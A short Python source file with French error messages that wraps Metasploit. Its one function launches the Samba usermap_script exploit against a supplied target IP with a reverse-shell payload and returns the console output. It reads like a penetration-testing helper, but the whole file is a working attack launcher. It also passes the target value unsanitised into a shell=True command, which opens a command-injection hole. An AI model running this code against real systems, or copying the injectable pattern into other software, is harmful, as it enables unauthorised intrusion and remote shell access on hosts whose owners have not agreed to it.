import subprocess

def run_metasploit(target_ip):
    try:
        command = f"msfconsole -q -x 'use exploit/multi/samba/usermap_script; set RHOSTS {target_ip}; set PAYLOAD cmd/unix/reverse; set LHOST 127.0.0.1; run; exit'"
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=180)
        return result.decode()
    except subprocess.CalledProcessError as e:
        return f"[ERREUR] Commande échouée : {e.output.decode()}"
    except Exception as ex:
        return f"[ERREUR] Exception : {str(ex)}"
